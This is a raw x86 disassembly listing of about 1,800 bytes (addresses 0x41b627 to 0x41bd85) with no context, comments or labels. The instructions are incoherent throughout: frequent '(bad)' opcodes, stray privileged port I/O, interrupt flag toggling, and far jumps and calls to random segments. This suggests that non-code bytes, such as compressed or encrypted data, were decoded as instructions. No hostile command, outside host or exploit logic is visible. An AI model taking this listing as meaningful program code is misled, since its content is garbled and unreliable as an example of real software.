  41b627:	jmp    0x5cac:0xec2f3bd0
  41b62e:	ins    DWORD PTR es:[edi],dx
  41b62f:	rol    DWORD PTR [edi+0x4],1
  41b632:	jl     0x41b609
  41b634:	mov    ebx,0x55710c86
  41b639:	cdq    
  41b63a:	mov    ds:0xb7e67557,eax
  41b63f:	mov    dh,0xd7
  41b641:	adc    BYTE PTR [edx-0x4f],bl
  41b644:	addr16 aas 
  41b646:	mov    dl,0x41
  41b648:	inc    ebp
  41b649:	xchg   edi,eax
  41b64a:	xchg   edx,eax
  41b64b:	push   cs
  41b64c:	xlat   BYTE PTR ds:[ebx]
  41b64d:	scas   eax,DWORD PTR es:[edi]
  41b64e:	lock cmp eax,eax
  41b651:	push   ss
  41b652:	imul   esp,DWORD PTR [eax-0x55],0x33
  41b656:	mov    ds:0x3144f34d,eax
  41b65b:	push   0x59
  41b65d:	add    BYTE PTR [eax],al
  41b65f:	add    BYTE PTR [eax],al
  41b661:	add    dh,al
  41b663:	aaa    
  41b664:	sti    
  41b665:	addr16 sti 
  41b667:	out    dx,eax
  41b668:	fidiv  WORD PTR [edi-0x5c01975c]
  41b66e:	jb     0x41b62e
  41b670:	fxch   st(6)
  41b672:	xor    BYTE PTR [edx],0x1
  41b675:	add    bl,dh
  41b677:	add    al,0x0
  41b679:	add    BYTE PTR [edx-0x62943980],dl
  41b67f:	(bad)
  41b683:	out    dx,al
  41b684:	or     eax,DWORD PTR [eax]
  41b686:	cmp    eax,0x67360d3b
  41b68b:	(bad)  
  41b68c:	jp     0x41b61b
  41b68e:	mov    BYTE PTR [esi],al
  41b690:	fstp   DWORD PTR [esp+ebx*4]
  41b693:	into   
  41b694:	punpcklbw mm0,DWORD PTR [eax*8+0x16460921]
  41b69c:	or     eax,DWORD PTR [esi+0x2d]
  41b69f:	cmp    DWORD PTR [edx],edx
  41b6a1:	mov    eax,0xd2fbaf05
  41b6a6:	gs push edi
  41b6a8:	fmul   st(6),st
  41b6aa:	inc    edi
  41b6ab:	imul   edi,esp,0x5f
  41b6ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6af:	stc    
  41b6b0:	pop    ds
  41b6b1:	xchg   ebx,eax
  41b6b2:	sbb    DWORD PTR [esi+0x726d6243],ebx
  41b6b8:	pop    edi
  41b6ba:	cli    
  41b6bb:	out    dx,al
  41b6bc:	test   eax,0x501d9c01
  41b6c1:	je     0x41b64a
  41b6c3:	int    0x20
  41b6c5:	jp     0x41b713
  41b6c7:	xchg   ebp,eax
  41b6c8:	add    eax,0xbb5bf807
  41b6cd:	dec    ecx
  41b6ce:	lods   al,BYTE PTR ds:[esi]
  41b6cf:	pop    edx
  41b6d0:	jbe    0x41b730
  41b6d2:	aam    0xa4
  41b6d4:	fwait
  41b6d5:	adc    al,0x29
  41b6d7:	popf   
  41b6d8:	pop    ebx
  41b6d9:	xchg   edx,eax
  41b6da:	adc    ch,ah
  41b6dc:	data16 mov ah,0x1f
  41b6df:	inc    esp
  41b6e0:	push   eax
  41b6e1:	ja     0x41b678
  41b6e3:	sti    
  41b6e4:	(bad)  [eax+0x17]
  41b6e7:	mov    ds:0x3bc93533,eax
  41b6ec:	imul   eax,ebx,0xa6074f56
  41b6f2:	inc    ebp
  41b6f3:	(bad)  
  41b6f4:	fldcw  WORD PTR [ebx-0x4a]
  41b6f7:	shl    DWORD PTR [edx-0x3304d2b3],cl
  41b6fd:	hlt    
  41b6fe:	lods   al,BYTE PTR ds:[esi]
  41b6ff:	fadd   QWORD PTR [edi+0x71bf746f]
  41b705:	popf   
  41b706:	in     al,0x6a
  41b708:	cld    
  41b709:	lea    ecx,[esi+0x42]
  41b70c:	sahf   
  41b70d:	inc    edi
  41b70e:	fidiv  WORD PTR [edx+0x28582734]
  41b714:	or     edi,ecx
  41b716:	call   0xba73:0xec8ea245
  41b71d:	lahf   
  41b71e:	sar    BYTE PTR [ebx-0x7a],0x70
  41b722:	adc    dh,0xb2
  41b725:	ins    BYTE PTR es:[edi],dx
  41b726:	out    dx,al
  41b727:	mov    ecx,0xbfb8ea2a
  41b72c:	sub    dh,BYTE PTR [ebx]
  41b72e:	idiv   ebx
  41b730:	in     al,0xd5
  41b732:	bound  esp,QWORD PTR [edi+0x1b4c546d]
  41b738:	or     al,0x2f
  41b73a:	ja     0x41b7b0
  41b73c:	addr16 fwait
  41b73e:	test   eax,0xf10998c4
  41b743:	lods   al,BYTE PTR ds:[esi]
  41b744:	test   bh,dl
  41b746:	cmp    DWORD PTR [edi],edx
  41b748:	mov    WORD PTR [ecx+ecx*2],?
  41b74b:	jmp    0xd1e1:0xeb493684
  41b752:	mov    ecx,0x8455707
  41b757:	adc    DWORD PTR ds:0xce9ded38,eax
  41b75d:	icebp  
  41b75e:	fidiv  DWORD PTR [eax+edx*1]
  41b761:	int3   
  41b762:	bound  ecx,QWORD PTR [edi+esi*4-0x2a3f9f16]
  41b769:	ret    
  41b76a:	ret    0x8e6
  41b76d:	sub    al,0x22
  41b76f:	push   0x5
  41b771:	imul   ebx,DWORD PTR ds:0xa43c7354,0xffffffc2
  41b778:	repz xor eax,0x11bafc4c
  41b77e:	idiv   bl
  41b780:	stos   DWORD PTR es:[edi],eax
  41b781:	fadd   QWORD PTR [edx+0x75dfbf2c]
  41b787:	pop    ds
  41b788:	outs   dx,BYTE PTR ds:[esi]
  41b789:	mov    ch,0x17
  41b78b:	sub    eax,ebp
  41b78d:	cld    
  41b78e:	icebp  
  41b78f:	rcr    BYTE PTR [esi+0x42],1
  41b792:	std    
  41b793:	mov    ds:0xace05d83,eax
  41b798:	fs sub eax,0xceb75476
  41b79e:	ja     0x41b728
  41b7a0:	mov    edx,esp
  41b7a2:	fcom   QWORD PTR [eax-0x733fbac6]
  41b7a8:	jbe    0x41b736
  41b7aa:	inc    eax
  41b7ab:	and    cl,ch
  41b7ad:	xor    eax,0xaa547d28
  41b7b2:	push   eax
  41b7b3:	cmc    
  41b7b4:	ds mov ebp,0xb0397a3d
  41b7ba:	mov    ecx,ebx
  41b7bc:	sbb    edx,esp
  41b7be:	pop    esi
  41b7bf:	dec    ebp
  41b7c0:	inc    edx
  41b7c1:	inc    ecx
  41b7c2:	(bad)  
  41b7c4:	(bad)  
  41b7c5:	jb     0x41b7ec
  41b7c7:	sahf   
  41b7c8:	(bad)
  41b7cc:	cld    
  41b7cd:	xchg   BYTE PTR [ecx+0x44cdf264],ch
  41b7d3:	mov    edx,0x44a6a4c6
  41b7d8:	daa    
  41b7d9:	xchg   esp,eax
  41b7da:	data16 mov dh,0x44
  41b7dd:	mov    bh,0xe5
  41b7df:	or     bh,0x9f
  41b7e2:	dec    esp
  41b7e3:	ror    BYTE PTR [ebx],1
  41b7e5:	mov    bh,0x5e
  41b7e7:	jmp    0x69d98c76
  41b7ec:	dec    esi
  41b7ed:	jge    0x41b7d1
  41b7ef:	and    ebx,ebx
  41b7f1:	inc    edi
  41b7f2:	(bad)  
  41b7f3:	pop    esi
  41b7f4:	mov    dh,0xcd
  41b7f6:	push   0xf
  41b7f8:	sbb    DWORD PTR [edi],edi
  41b7fa:	data16 loop 0x41b854
  41b7fd:	jmp    0x41b7ac
  41b7ff:	fcomp  DWORD PTR [ecx]
  41b801:	or     al,0x64
  41b803:	jae    0x41b810
  41b805:	ficom  WORD PTR [esi+0x4f85a0dd]
  41b80b:	ds cwde 
  41b80d:	xor    ebx,ebx
  41b80f:	sub    ch,BYTE PTR [esi+0x5a]
  41b812:	or     DWORD PTR ds:0xe074d54,0xd
  41b819:	sub    BYTE PTR [edx],bl
  41b81b:	cmc    
  41b81c:	mov    esp,0x4cefd6c8
  41b821:	mov    al,0x81
  41b823:	jbe    0x41b7d6
  41b825:	scas   al,BYTE PTR es:[edi]
  41b826:	sub    eax,esi
  41b828:	aas    
  41b829:	jbe    0x41b872
  41b82b:	ficomp DWORD PTR [ebp+0x69c47d61]
  41b831:	jl     0x41b849
  41b833:	jbe    0x41b823
  41b835:	hlt    
  41b836:	fwait
  41b837:	inc    ebp
  41b838:	cmp    dh,BYTE PTR [edi+0x4fdd6324]
  41b83e:	fmul   DWORD PTR [eax+0x55]
  41b841:	push   ss
  41b842:	mov    bh,ah
  41b844:	pop    eax
  41b845:	mov    esp,DWORD PTR [ebx]
  41b847:	pop    esp
  41b848:	call   0x804b4eba
  41b84d:	push   ebx
  41b84e:	sub    esp,esi
  41b850:	mov    dl,0xb3
  41b852:	bound  esi,QWORD PTR [edx+0x3c]
  41b855:	lods   eax,DWORD PTR ds:[esi]
  41b856:	into   
  41b857:	dec    ecx
  41b858:	inc    esp
  41b859:	xchg   ebp,eax
  41b85a:	mov    eax,0x5f042148
  41b85f:	and    BYTE PTR [esi+0x4f],ah
  41b862:	imul   eax,ecx,0xf2c9181e
  41b868:	or     al,0x40
  41b86a:	pop    eax
  41b86b:	out    0xfb,eax
  41b86d:	mov    dl,ah
  41b86f:	rcr    DWORD PTR [eax+0x599f6f17],1
  41b875:	pop    ds
  41b876:	push   eax
  41b877:	dec    esp
  41b878:	aam    0x9
  41b87a:	push   ebx
  41b87b:	jns    0x41b80e
  41b87d:	add    DWORD PTR ds:0x8fabc790,ecx
  41b883:	jge    0x41b8a8
  41b885:	push   ss
  41b886:	push   edx
  41b887:	or     edx,DWORD PTR [edi+0x472fe55f]
  41b88d:	xchg   edx,eax
  41b88e:	cli    
  41b88f:	or     al,BYTE PTR [edx]
  41b891:	sub    eax,0x364c75b4
  41b896:	xchg   esi,eax
  41b897:	add    DWORD PTR [ebp-0x4d7577],esi
  41b89d:	mov    bh,0xb4
  41b89f:	jle    0x41b83e
  41b8a1:	std    
  41b8a2:	test   al,cl
  41b8a4:	sti    
  41b8a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8a6:	mov    ah,0x71
  41b8a8:	es aad 0x9c
  41b8ab:	mov    ch,0x4e
  41b8ad:	xor    DWORD PTR [esi-0x21e02a34],esi
  41b8b3:	js     0x41b91a
  41b8b5:	ds clc 
  41b8b7:	xchg   ebp,eax
  41b8b8:	adc    eax,edi
  41b8ba:	and    cl,dh
  41b8bc:	xor    edx,esp
  41b8be:	popa   
  41b8bf:	pop    edi
  41b8c0:	mov    BYTE PTR [edx],ah
  41b8c2:	pop    DWORD PTR [ecx-0x72]
  41b8c5:	mov    ecx,0xc6a25e66
  41b8ca:	or     edx,esi
  41b8cc:	scas   eax,DWORD PTR es:[edi]
  41b8cd:	or     DWORD PTR [eax+0x2f],ebx
  41b8d0:	inc    edi
  41b8d1:	popa   
  41b8d2:	pop    ebx
  41b8d3:	je     0x41b8ec
  41b8d5:	mov    ds:0xa680adf,eax
  41b8da:	push   eax
  41b8db:	sti    
  41b8dc:	pop    edx
  41b8dd:	mov    WORD PTR [eax+0x7b76428e],?
  41b8e3:	jg     0x41b934
  41b8e5:	push   ecx
  41b8e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8e7:	call   0x757106d0
  41b8ec:	sbb    al,0x7a
  41b8ee:	out    0x6a,eax
  41b8f0:	mov    ch,ah
  41b8f2:	jp     0x41b8d1
  41b8f4:	or     BYTE PTR [ecx],dl
  41b8f6:	mov    bl,0x56
  41b8f8:	daa    
  41b8f9:	adc    BYTE PTR [esi-0x58],bh
  41b8fc:	(bad)  
  41b8fd:	shl    DWORD PTR [ebx*1+0x3b262800],1
  41b904:	sub    bl,BYTE PTR [esi+eiz*4+0x7f1e08b1]
  41b90b:	mov    ebp,0x595c76b5
  41b910:	dec    esp
  41b911:	dec    edi
  41b912:	iret   
  41b913:	pop    ebp
  41b914:	fiadd  WORD PTR [eax+0x47]
  41b917:	daa    
  41b918:	mov    edi,0x93ef963
  41b91d:	outs   dx,DWORD PTR ds:[esi]
  41b91e:	sar    DWORD PTR [ecx],cl
  41b920:	retf   
  41b921:	shl    eax,0x6b
  41b924:	pop    ebx
  41b925:	popa   
  41b926:	leave  
  41b927:	pop    ebx
  41b928:	ret    0x5f11
  41b92b:	rcr    DWORD PTR [ecx-0x67],1
  41b92e:	ret    0x36ed
  41b931:	(bad)  
  41b932:	cmp    eax,0x339edce8
  41b937:	mov    ecx,0x3d7dfcf6
  41b93c:	test   al,0x9c
  41b93e:	pop    edi
  41b93f:	inc    ebx
  41b940:	fwait
  41b941:	or     al,0xf6
  41b943:	mov    ds:0x84f3a4f5,al
  41b948:	(bad)  
  41b94a:	pop    ss
  41b94b:	dec    eax
  41b94c:	mov    ch,0x89
  41b94e:	rcr    BYTE PTR [ebx-0x70],0x42
  41b952:	jmp    0x460052ea
  41b957:	sbb    ebp,esi
  41b959:	sahf   
  41b95a:	and    BYTE PTR [eax],0x97
  41b95d:	rcl    BYTE PTR [edx+0x61],0x26
  41b961:	jmp    0x2c85:0xa53372df
  41b968:	push   esi
  41b969:	push   eax
  41b96a:	cld    
  41b96b:	in     eax,dx
  41b96c:	inc    ebx
  41b96d:	pop    ds
  41b96e:	jp     0x41b8f6
  41b970:	cmp    al,0x14
  41b972:	jo     0x41b935
  41b974:	mov    ch,0x8
  41b976:	sahf   
  41b977:	rol    DWORD PTR [esi-0x56],0xc3
  41b97b:	sub    DWORD PTR [edx+0x3c],ebx
  41b97e:	ja     0x41b992
  41b980:	pop    eax
  41b981:	mov    BYTE PTR [ecx+0x47],ah
  41b984:	dec    ecx
  41b985:	add    DWORD PTR [edx-0x1a974119],edx
  41b98b:	test   BYTE PTR [ebx],bh
  41b98d:	pop    edx
  41b98e:	or     ebp,DWORD PTR [ecx+0x6f]
  41b991:	and    esi,DWORD PTR [ebx-0x6eda31fb]
  41b997:	mov    bl,0x33
  41b999:	pop    edx
  41b99a:	mov    eax,ds:0x51ed6a82
  41b99f:	retfw  0x46b8
  41b9a3:	sti    
  41b9a4:	jmp    0x3d239a36
  41b9a9:	retf   
  41b9aa:	sbb    dh,BYTE PTR [esi-0x18]
  41b9ad:	sub    eax,0x8949a552
  41b9b2:	jmp    0x8d311420
  41b9b7:	mov    BYTE PTR ds:0x991a0ef0,ch
  41b9bd:	mov    edx,0x4687a7f3
  41b9c2:	mov    cl,0xf3
  41b9c4:	iret   
  41b9c5:	cmc    
  41b9c6:	and    al,0xcd
  41b9c8:	cli    
  41b9c9:	inc    ebx
  41b9ca:	mov    esi,0xbb2f2b6c
  41b9cf:	mov    esp,0x9edb677c
  41b9d4:	jb     0x41b9cb
  41b9d6:	popa   
  41b9d7:	retf   0x9b6f
  41b9da:	imul   ah
  41b9dc:	mov    eax,0x1465648a
  41b9e1:	cwde   
  41b9e2:	or     edi,DWORD PTR [edx+0x7d01bcdd]
  41b9e8:	and    BYTE PTR [edi+ecx*4-0x55bfd29],ch
  41b9ef:	cdq    
  41b9f0:	rcr    esp,0x6e
  41b9f3:	retf   
  41b9f4:	mov    cl,0xdc
  41b9f6:	std    
  41b9f7:	mov    esp,0xc47c3724
  41b9fc:	(bad)  
  41b9fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9fe:	or     dh,ah
  41ba00:	aam    0xc0
  41ba02:	inc    esp
  41ba03:	das    
  41ba04:	adc    al,0x3d
  41ba06:	ds mov bl,0x3e
  41ba09:	adc    BYTE PTR [ecx+0x24309a9c],bl
  41ba0f:	sub    al,0xb0
  41ba11:	pop    ss
  41ba12:	jno    0x41b9da
  41ba14:	mov    edi,0x6017ca1e
  41ba19:	mov    eax,DWORD PTR [ecx-0xf]
  41ba1c:	sbb    BYTE PTR [edx],ch
  41ba1e:	mov    ebx,0x36d697e8
  41ba23:	xchg   ebp,eax
  41ba24:	in     al,0x5
  41ba26:	mov    eax,DWORD PTR [edi-0x8b949c5]
  41ba2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba2e:	or     eax,0x7520f885
  41ba33:	sbb    eax,0xda2e0a3
  41ba38:	adc    ah,BYTE PTR [ebp-0x60]
  41ba3b:	sti    
  41ba3c:	add    al,0x7b
  41ba3e:	ret    
  41ba3f:	mov    bh,0x94
  41ba41:	pop    ss
  41ba42:	test   DWORD PTR [edi],0x9658fc56
  41ba48:	mov    al,ds:0xdd1d8cbd
  41ba4d:	mov    eax,ds:0x8ab977c0
  41ba52:	pop    esp
  41ba53:	push   edi
  41ba54:	sahf   
  41ba55:	adc    eax,0xbdb74d3
  41ba5a:	jb     0x41b9f8
  41ba5c:	mov    ah,0x51
  41ba5e:	pop    edx
  41ba5f:	ins    DWORD PTR es:[edi],dx
  41ba60:	rcl    BYTE PTR [ebp-0x2e],0x91
  41ba64:	mov    bh,bh
  41ba66:	and    BYTE PTR [ebx],0x3f
  41ba69:	mov    edi,0x813812d6
  41ba6e:	mov    ds:0x65a36097,eax
  41ba73:	xor    dl,dh
  41ba75:	data16 fwait
  41ba77:	xchg   esi,eax
  41ba78:	adc    DWORD PTR [ecx+0x5d],ebp
  41ba7b:	sti    
  41ba7c:	jmp    FWORD PTR [ebx-0x61]
  41ba7f:	dec    esp
  41ba80:	mov    eax,0xfe60212b
  41ba85:	imul   esp,DWORD PTR ds:0x681deac,0x3b6d68e4
  41ba8f:	test   DWORD PTR [ebp-0x5db995a9],edi
  41ba95:	and    DWORD PTR [edx],0xea8580c9
  41ba9b:	lods   eax,DWORD PTR ds:[esi]
  41ba9c:	add    al,0xca
  41ba9e:	mov    cl,0xf9
  41baa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baa1:	mov    ds:0x38e2ee9f,eax
  41baa6:	adc    BYTE PTR [esi],0x8f
  41baa9:	jne    0x41ba51
  41baab:	push   ss
  41baac:	mov    bh,0x4d
  41baae:	sbb    eax,0xc0a2c42a
  41bab3:	sti    
  41bab4:	jbe    0x41bab4
  41bab6:	xor    ebx,DWORD PTR [edi]
  41bab8:	or     dh,BYTE PTR [edi+0x16]
  41babb:	push   0x58
  41babd:	aaa    
  41babe:	push   sp
  41bac0:	imul   esi,DWORD PTR [eax+0x50],0x9
  41bac4:	mov    DWORD PTR [edx+0x45],ebp
  41bac7:	mov    eax,0x6ef2e89f
  41bacc:	int3   
  41bacd:	rcl    BYTE PTR [ecx*2-0x165a1142],0x99
  41bad5:	enter  0x1895,0xfc
  41bad9:	loopne 0x41bab8
  41badb:	or     DWORD PTR ds:0x35abd419,eax
  41bae1:	pusha  
  41bae2:	fisubr DWORD PTR [esi-0x52]
  41bae5:	pop    ds
  41bae6:	out    dx,eax
  41bae7:	inc    ebp
  41bae8:	imul   esp,ebp,0x920ffa50
  41baee:	inc    edx
  41baef:	or     dl,dl
  41baf1:	out    dx,eax
  41baf2:	xor    ah,BYTE PTR [esi-0x136d3074]
  41baf8:	mov    edi,0x8bd2d878
  41bafd:	pop    ss
  41bafe:	xor    edi,DWORD PTR [ebp+0x50fc9f9]
  41bb04:	aaa    
  41bb05:	sti    
  41bb06:	xchg   esi,eax
  41bb07:	adc    eax,0x4bdd6e3d
  41bb0c:	outs   dx,DWORD PTR ds:[esi]
  41bb0d:	xchg   ebp,eax
  41bb0e:	add    esp,DWORD PTR [ebp+0x3d2f327f]
  41bb14:	js     0x41baad
  41bb16:	repz jg 0x41bae8
  41bb19:	jne    0x41bad9
  41bb1b:	repnz retf 
  41bb1d:	stos   BYTE PTR es:[edi],al
  41bb1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb1f:	xchg   esp,eax
  41bb20:	ja     0x41bb6d
  41bb22:	xchg   edx,eax
  41bb23:	push   eax
  41bb24:	shr    BYTE PTR [edi+0x4],cl
  41bb27:	mov    DWORD PTR [eax+0x55],eax
  41bb2a:	xor    cl,bl
  41bb2c:	dec    esp
  41bb2d:	adc    eax,0x12048a8c
  41bb32:	mov    ebp,0x2a0cb4da
  41bb37:	aas    
  41bb38:	add    al,BYTE PTR [ecx-0xf425a8a]
  41bb3e:	in     al,0xc1
  41bb40:	and    cl,dh
  41bb42:	xchg   edi,eax
  41bb43:	push   ebx
  41bb44:	add    al,bl
  41bb46:	adc    BYTE PTR [edx],cl
  41bb48:	and    DWORD PTR [ebp+0x4f],edi
  41bb4b:	in     eax,dx
  41bb4c:	inc    edx
  41bb4d:	push   es
  41bb4e:	fnstenv ds:0x28c3d943
  41bb54:	jl     0x41bb2f
  41bb56:	sub    bl,bl
  41bb58:	jg     0x41baf6
  41bb5a:	jle    0x41baea
  41bb5c:	add    ch,ch
  41bb5e:	adc    esp,DWORD PTR [esi+0x6da4566b]
  41bb64:	sti    
  41bb65:	gs int 0x14
  41bb68:	sub    DWORD PTR [eax],edx
  41bb6a:	(bad)  
  41bb6b:	hlt    
  41bb6c:	or     DWORD PTR [eax],eax
  41bb6e:	add    BYTE PTR [eax],al
  41bb70:	add    BYTE PTR [eax],al
  41bb72:	out    0x40,al
  41bb74:	sbb    eax,0xee5dbf15
  41bb79:	repz adc eax,0x2e442583
  41bb7f:	cs push ss
  41bb81:	add    esi,DWORD PTR [ebp+0x37]
  41bb84:	add    DWORD PTR [eax],eax
  41bb86:	repz add al,0x0
  41bb89:	add    dl,ch
  41bb8b:	fwait
  41bb8c:	rcl    BYTE PTR [edx],0x1e
  41bb8f:	cdq    
  41bb90:	sar    DWORD PTR [eax],0xf9
  41bb93:	cmc    
  41bb94:	dec    ebp
  41bb95:	scas   eax,DWORD PTR es:[edi]
  41bb96:	in     eax,0xb0
  41bb98:	icebp  
  41bb99:	int    0x8f
  41bb9b:	fisub  DWORD PTR [edx]
  41bb9d:	pop    es
  41bb9e:	push   edx
  41bb9f:	dec    edx
  41bba0:	jb     0x41bb95
  41bba2:	js     0x41bc0d
  41bba4:	imul   edx,DWORD PTR [ebx+ecx*2-0x6],0x2e22ff0b
  41bbac:	mov    ah,0xfb
  41bbae:	jle    0x41bbfe
  41bbb0:	xchg   edx,eax
  41bbb1:	scas   al,BYTE PTR es:[edi]
  41bbb2:	aas    
  41bbb3:	jns    0x41bba8
  41bbb5:	xchg   ebp,eax
  41bbb6:	aam    0x32
  41bbb8:	shr    DWORD PTR [esi-0x7fafef1e],0xd9
  41bbbf:	or     edi,ebx
  41bbc1:	jecxz  0x41bbcd
  41bbc3:	test   DWORD PTR [eax],esi
  41bbc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbc6:	sub    bl,al
  41bbc8:	test   DWORD PTR [esp+ebp*8],0x4c505859
  41bbcf:	push   ecx
  41bbd1:	jl     0x41bbdd
  41bbd3:	out    0x4b,al
  41bbd5:	inc    esi
  41bbd6:	xor    DWORD PTR [ebp+0x53],0xffffffe0
  41bbda:	sbb    ebp,DWORD PTR ds:0xfa0decde
  41bbe0:	aaa    
  41bbe1:	addr16 dec ecx
  41bbe3:	ins    DWORD PTR es:[edi],dx
  41bbe4:	test   BYTE PTR [edi],ah
  41bbe6:	mov    dh,0x91
  41bbe8:	jle    0x41bc51
  41bbea:	retf   
  41bbeb:	mov    ds:0xe5e9ad39,eax
  41bbf0:	clc    
  41bbf1:	push   0xa037cd95
  41bbf6:	jo     0x41bc3d
  41bbf8:	outs   dx,DWORD PTR ds:[esi]
  41bbf9:	jp     0x41bb97
  41bbfb:	dec    esi
  41bbfc:	lock lods eax,DWORD PTR ds:[esi]
  41bbfe:	inc    ecx
  41bbff:	jle    0x41bbb7
  41bc01:	ds leave 
  41bc03:	jbe    0x41bc79
  41bc05:	xchg   ebp,eax
  41bc06:	mov    ebp,0x6e2208da
  41bc0b:	mov    dl,0x45
  41bc0d:	xchg   DWORD PTR [edx-0x16],eax
  41bc10:	cmp    DWORD PTR [ebp+0x21],esi
  41bc13:	fnstcw WORD PTR [eax-0x49e9f5fd]
  41bc19:	xchg   BYTE PTR [eax+0x2],bh
  41bc1c:	pop    ebx
  41bc1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc1e:	stc    
  41bc1f:	rcl    BYTE PTR [eax-0x623a7390],cl
  41bc25:	lods   al,BYTE PTR ds:[esi]
  41bc26:	push   0xfffffffe
  41bc28:	mov    ebx,0xa7bea496
  41bc2d:	(bad)  
  41bc2f:	xor    ecx,eax
  41bc31:	daa    
  41bc32:	fcomi  st,st(4)
  41bc34:	xchg   ebp,eax
  41bc35:	sub    DWORD PTR [esi],ebx
  41bc37:	std    
  41bc38:	je     0x41bbf2
  41bc3a:	sub    edi,DWORD PTR ds:0x4910bdef
  41bc40:	cli    
  41bc41:	mov    eax,0xae38e8ff
  41bc46:	sub    bh,dh
  41bc48:	ja     0x41bc83
  41bc4a:	mov    DWORD PTR [ebx],ecx
  41bc4c:	mov    eax,0x3f19b217
  41bc51:	and    DWORD PTR [edx],edx
  41bc53:	cmp    ch,bl
  41bc55:	cmp    ecx,DWORD PTR ds:0x15b5d6c9
  41bc5b:	jmp    0xe613:0xbe51d61f
  41bc62:	idiv   ecx
  41bc64:	sbb    BYTE PTR [ecx+0x19656203],cl
  41bc6a:	add    eax,0x68d6b1d
  41bc6f:	push   ecx
  41bc70:	out    0x1d,eax
  41bc72:	sti    
  41bc73:	out    0xde,al
  41bc75:	and    BYTE PTR [esi+0x30ca4805],0xe1
  41bc7c:	int3   
  41bc7d:	push   edi
  41bc7e:	cmp    ch,ch
  41bc80:	ins    DWORD PTR es:[edi],dx
  41bc81:	inc    edi
  41bc82:	or     BYTE PTR [esi+0x7b],bl
  41bc85:	test   BYTE PTR [ebx],cl
  41bc87:	cli    
  41bc88:	inc    ecx
  41bc89:	ror    ebx,cl
  41bc8b:	jnp    0x41bc2c
  41bc8d:	imul   ebp,DWORD PTR [ebp+0x2b],0x5072f119
  41bc94:	push   0x26ce6571
  41bc99:	cmp    ch,bh
  41bc9b:	rcr    edi,0x30
  41bc9e:	dec    esi
  41bc9f:	cld    
  41bca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bca1:	push   es
  41bca2:	cli    
  41bca3:	jge    0x41bcdb
  41bca5:	in     eax,0xba
  41bca7:	jle    0x41bc5b
  41bca9:	mov    ah,dl
  41bcab:	mov    eax,0xcbd19be9
  41bcb0:	sahf   
  41bcb1:	jb     0x41bcfc
  41bcb3:	mov    DWORD PTR [esi],ecx
  41bcb5:	ds dec edi
  41bcb7:	in     eax,dx
  41bcb8:	out    0x62,eax
  41bcba:	push   ecx
  41bcbb:	gs nop
  41bcbd:	push   0xffffff89
  41bcbf:	outs   dx,BYTE PTR ds:[esi]
  41bcc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcc1:	test   DWORD PTR [ecx+ebx*2-0x56c0517e],0x990d3478
  41bccc:	dec    ebp
  41bccd:	fld    DWORD PTR [ecx-0x34]
  41bcd0:	(bad)  
  41bcd1:	out    dx,al
  41bcd2:	cmp    bl,BYTE PTR [eax]
  41bcd4:	pushf  
  41bcd5:	adc    BYTE PTR [edi+0x51ef36c4],ah
  41bcdb:	mov    dl,0x4d
  41bcdd:	sbb    DWORD PTR [edi+0x1b],ebx
  41bce0:	jns    0x41bd07
  41bce2:	sbb    BYTE PTR [ebx],ah
  41bce4:	out    0x9b,al
  41bce6:	aad    0x4c
  41bce8:	repnz stos DWORD PTR es:[edi],eax
  41bcea:	clc    
  41bceb:	xchg   ebx,eax
  41bcec:	push   ebx
  41bced:	push   cs
  41bcee:	repnz dec ebp
  41bcf0:	es popa 
  41bcf2:	(bad)  
  41bcf3:	cld    
  41bcf4:	es xor dl,ch
  41bcf7:	bound  ecx,QWORD PTR [ebx-0x507e8bde]
  41bcfd:	mov    cl,0x5b
  41bcff:	sbb    edx,DWORD PTR [esp+edi*4+0x35]
  41bd03:	scas   al,BYTE PTR es:[edi]
  41bd04:	push   cs
  41bd05:	in     eax,0xd7
  41bd07:	mov    bl,BYTE PTR [ebx+0x1f]
  41bd0a:	fstp   QWORD PTR [esi+0x32]
  41bd0d:	mov    dl,0xd7
  41bd0f:	jnp    0x41bd20
  41bd11:	adc    al,0x87
  41bd13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd14:	jl     0x41bd55
  41bd16:	(bad)  
  41bd17:	in     al,dx
  41bd18:	(bad)  
  41bd1a:	mov    edi,0x2a8c0f17
  41bd1f:	xchg   ecx,eax
  41bd20:	ja     0x41bd2f
  41bd22:	imul   ecx,DWORD PTR [eax],0x7c492c35
  41bd28:	ret    
  41bd29:	mov    al,ds:0x3b160a9f
  41bd2e:	mov    al,0x71
  41bd30:	adc    eax,0x88408b69
  41bd35:	scas   eax,DWORD PTR es:[edi]
  41bd36:	in     al,dx
  41bd37:	sbb    ecx,0xaa7615e2
  41bd3d:	popf   
  41bd3e:	ffree  st(3)
  41bd40:	test   eax,0x66d9fad5
  41bd45:	pop    esp
  41bd46:	sub    BYTE PTR [eax],dh
  41bd48:	add    al,0x60
  41bd4a:	sbb    DWORD PTR [ebx-0x34],esp
  41bd4d:	xchg   edx,eax
  41bd4e:	mov    ah,0xa2
  41bd50:	push   edi
  41bd51:	add    eax,0xdae264f9
  41bd56:	jp     0x41bcda
  41bd58:	aad    0x14
  41bd5a:	push   cs
  41bd5b:	mov    ebx,0x60c410af
  41bd60:	not    DWORD PTR [ecx]
  41bd62:	push   edx
  41bd63:	icebp  
  41bd64:	call   0x4aaf9e50
  41bd69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd6a:	dec    ecx
  41bd6b:	mov    ds:0x8c4358e7,eax
  41bd70:	mov    WORD PTR ds:0xa4bd5556,cs
  41bd76:	outs   dx,BYTE PTR ds:[esi]
  41bd77:	mov    eax,ds:0x82684efe
  41bd7c:	and    BYTE PTR [eax],dl
  41bd7e:	lahf   
  41bd7f:	popa   
  41bd80:	xor    al,0xf8
  41bd82:	push   ds
  41bd83:	xor    al,0x64
  41bd85:	mov    ch,dh
